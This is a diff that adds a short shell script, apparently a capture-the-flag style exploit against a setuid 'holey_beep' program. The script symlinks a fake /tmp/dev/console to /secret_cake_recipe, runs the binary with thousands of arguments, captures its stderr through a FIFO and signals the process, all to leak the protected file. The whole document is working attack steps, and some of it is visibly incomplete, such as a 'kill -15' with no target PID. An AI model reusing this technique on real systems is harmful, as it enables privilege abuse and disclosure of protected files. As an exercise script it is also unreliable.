@@ -1,0 +1,21 @@
+
+sh
+cd /tmp
+mkdir dev
+ln -s /secret_cake_recipe /tmp/dev/console
+mkfifo /tmp/xyz
+/home/user/holey_beep $(seq 1 1 5000) 2> /tmp/xyz &
+( sleep 30; cat - ) < /tmp/xyz &
+pgrep holey_beep
+
+ps aux | grep holey_beep | head -c 100
+
+kill -15
+
+
+
+
+
+
+
+
